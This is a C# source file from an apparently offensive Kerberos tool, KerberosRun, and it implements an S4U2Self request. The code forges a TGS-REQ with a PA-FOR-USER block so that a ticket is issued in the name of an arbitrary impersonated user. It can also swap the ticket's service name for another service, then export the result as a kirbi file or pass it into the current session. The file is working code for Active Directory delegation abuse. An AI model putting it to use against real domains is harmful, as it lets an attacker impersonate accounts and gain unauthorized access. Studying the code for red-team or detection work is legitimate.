using Kerberos.NET;
using Kerberos.NET.Client;
using Kerberos.NET.Credentials;
using Kerberos.NET.Crypto;
using Kerberos.NET.Entities;
using Kerberos.NET.Transport;
using NLog;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace KerberosRun
{
    public class S4U2Self
    {
        private readonly DateTime now;
        private readonly TcpKerberosTransport transport;
        private KerberosCredential cred;
        private string clientName;
        private static KrbTicket tgt;
        private static KrbEncryptionKey sessionKey;
        private KrbEncryptionKey subSessionKey;
        private KrbTgsReq tgsReq;
        private KrbTgsRep tgsRep;
        private KrbEncTgsRepPart tgsDecryptedRepPart;
        private KrbEncTicketPart ticketDecrypted;
        //private KrbEncryptionKey s4u2selfKey;
        internal KrbTicket s4u2selfTicket;
        private byte[] kirbiTGS;

        Logger logger;

        public S4U2Self(KrbTicket ticket, KrbEncryptionKey key)
        {
            logger = LogManager.GetCurrentClassLogger();
            now = DateTime.Now;
            transport = new TcpKerberosTransport(null);

            tgt = ticket;
            sessionKey = key;
            cred = Helper.GetCredFromOption();
        }


        public S4U2Self(TGT myTGT) : this(tgt, sessionKey)
        {
            tgt = myTGT.Ticket;
            sessionKey = myTGT.sessionKey;

        }

        public S4U2Self(string tgtKirbi) : this(tgt, sessionKey)
        {
            var info = Kirbi.GetTicketFromKirbi(tgtKirbi);
            tgt = info.Ticket;
            sessionKey = info.SessionKey;
            clientName = info.CNAME;

        }
 

        public void CreateS4U2SelfRequest()
        {
            //Request Service Ticket parameters

            ApOptions apOptions = ApOptions.Reserved;
            KdcOptions kdcOptions =
            KdcOptions.Forwardable |
            KdcOptions.Renewable |
            KdcOptions.RenewableOk;
            string s4u = Options.Instance.ImpersonateUser;
            KrbTicket s4uTicket = null;
            KrbTicket u2uServerTicket = null;


            var rst = new RequestServiceTicket()
            {
                ApOptions = apOptions,
                S4uTarget = s4u,
                S4uTicket = s4uTicket,
                UserToUserTicket = u2uServerTicket,
                KdcOptions = kdcOptions,
                Realm = tgt.Realm,
            };

            var additionalTickets = new List<KrbTicket>();

            if (rst.KdcOptions.HasFlag(KdcOptions.EncTktInSkey) && rst.UserToUserTicket != null)
            {
                additionalTickets.Add(rst.UserToUserTicket);
            }
            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                rst.KdcOptions |= KdcOptions.EncTktInSkey;
            }
            if (rst.S4uTicket != null)
            {
                rst.KdcOptions |= KdcOptions.ConstrainedDelegation;

                additionalTickets.Add(rst.S4uTicket);
            }



            //EncryptionType[] kdcReqEtype = { EncryptionType.RC4_HMAC_NT };

            clientName = string.IsNullOrEmpty(Options.Instance.User) ? clientName : Options.Instance.User;
            string[] name = { clientName };

            var body = new KrbKdcReqBody
            {
                EType = KrbConstants.KerberosConstants.ETypes.ToArray(),
                KdcOptions = rst.KdcOptions,
                Nonce = KrbConstants.KerberosConstants.GetNonce(),
                Realm = rst.Realm,
                SName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = name
                },
                Till = KrbConstants.KerberosConstants.EndOfTime,
                CName = new KrbPrincipalName()
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = name
                }
            };


            if (additionalTickets.Count > 0)
            {
                body.AdditionalTickets = additionalTickets.ToArray();
            }

            var bodyChecksum = KrbChecksum.Create(
                body.Encode(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqChecksum
            );


            //ApReq
            //Authenticator
            var CName = new KrbPrincipalName()
            {
                Type = PrincipalNameType.NT_PRINCIPAL,
                Name = new[] { clientName }// + "@" + domainName.ToUpper() }
            };
            var authenticator = new KrbAuthenticator
            {
                CName = CName,
                Realm = tgt.Realm,
                SequenceNumber = KrbConstants.KerberosConstants.GetNonce(),
                Checksum = bodyChecksum,
                CTime = now,
                CuSec = now.Millisecond //new Random().Next(0, 999999)
            };

            subSessionKey = KrbEncryptionKey.Generate(sessionKey.EType);

            subSessionKey.Usage = KeyUsage.EncTgsRepPartSubSessionKey;
            authenticator.Subkey = subSessionKey;

            var encryptedAuthenticator = KrbEncryptedData.Encrypt(
                authenticator.EncodeApplication(),
                sessionKey.AsKey(),
                KeyUsage.PaTgsReqAuthenticator
            );


            var apReq = new KrbApReq
            {
                Ticket = tgt,
                ApOptions = apOptions,
                Authenticator = encryptedAuthenticator
            };



            var paData = new List<KrbPaData>()
            {
                new KrbPaData
                {
                    Type = PaDataType.PA_TGS_REQ,
                    Value = apReq.EncodeApplication()
                }
            };

            if (!string.IsNullOrWhiteSpace(rst.S4uTarget))
            {
                var paS4u = new KrbPaForUser
                {
                    AuthPackage = "Kerberos",
                    UserName = new KrbPrincipalName { Type = PrincipalNameType.NT_ENTERPRISE, Name = new[] { s4u } },
                    UserRealm = tgt.Realm
                };
                paS4u.GenerateChecksum(sessionKey.AsKey());

                paData.Add(new KrbPaData
                {
                    Type = PaDataType.PA_FOR_USER,
                    Value = paS4u.Encode()
                });
            }

            tgsReq = new KrbTgsReq
            {
                PaData = paData.ToArray(),
                Body = body
            };

        }




        public async Task<KrbTgsRep> AskS4U2SelfAsync()
        {
            CreateS4U2SelfRequest();

            var encodedTgs = tgsReq.EncodeApplication();

            logger.Info("[*] Sending TGS-REQ [S4U2Self] ...");
            if (Options.Instance.Verbose && cred != null) { Display.PrintReq(tgsReq, cred.CreateKey(), sessionKey.AsKey()); }

            CancellationToken cancellation = default;
            cancellation.ThrowIfCancellationRequested();
 
            try
            {
                tgsRep = await transport.SendMessage<KrbTgsRep>(
                    tgt.Realm,
                    encodedTgs,
                    cancellation
                );
            }
            catch (KerberosProtocolException pex)
            {
                logger.Info("[x] Kerberos Error: {0}", pex.Message);
                Environment.Exit(0);
            }


            logger.Info("[*] Receiving TGS-REP [S4U2Self] ...");



            tgsDecryptedRepPart = tgsRep.EncPart.Decrypt<KrbEncTgsRepPart>(
                    subSessionKey.AsKey(),
                    KeyUsage.EncTgsRepPartSubSessionKey,
                    (ReadOnlyMemory<byte> t) => KrbEncTgsRepPart.DecodeApplication(t));



            //alternative service name
            if (Options.Instance.AltService != null)
            {
                var subSrvName = new KrbPrincipalName
                {
                    Type = PrincipalNameType.NT_PRINCIPAL,
                    Name = Options.Instance.AltService.Split('/')
                };
                tgsDecryptedRepPart.SName = subSrvName;
                tgsRep.Ticket.SName = subSrvName;
            }
            kirbiTGS = Kirbi.GetKirbi(tgsRep, tgsDecryptedRepPart, Options.Instance.PTT);

            //TGS-REQ Ticket Enc-Part
            try
            {
                ticketDecrypted = tgsRep.Ticket.EncryptedPart.Decrypt
                (cred.CreateKey(),
                KeyUsage.Ticket,
                (ReadOnlyMemory<byte> t) => KrbEncTicketPart.DecodeApplication(t));
                //s4u2selfKey = ticketDecrypted.Key;
            }
            catch (Exception e)
            {
                logger.Error($"[x] Decryption Error: {e.Message}");
            }



            s4u2selfTicket = tgsRep.Ticket;
            return tgsRep;


        }



        public string ToKirbi()
        {
            return Convert.ToBase64String(kirbiTGS);
        }

        public void ToFile()
        {
            Utils.WriteBytesToFile(Utils.MakeTicketFileName(Options.Instance.ImpersonateUser), kirbiTGS);
        }



        public void DisplayS4U2Self()
        {
            if (!Options.Instance.Verbose) { return; }
            try
            {
                Display.PrintRep(tgsRep, cred.CreateKey());

                Console.WriteLine("    * [Decrypted Enc-Part]:");
                Display.PrintRepEnc(tgsDecryptedRepPart, cred.CreateKey());

                //=========================================
                if (ticketDecrypted != null)
                {
                    Console.WriteLine("    * [Decrypted Ticket Enc-Part]:");
                    Display.PrintTicketEnc(ticketDecrypted);
                }
                //=========================================
            }
            catch { }




        }
    }
}
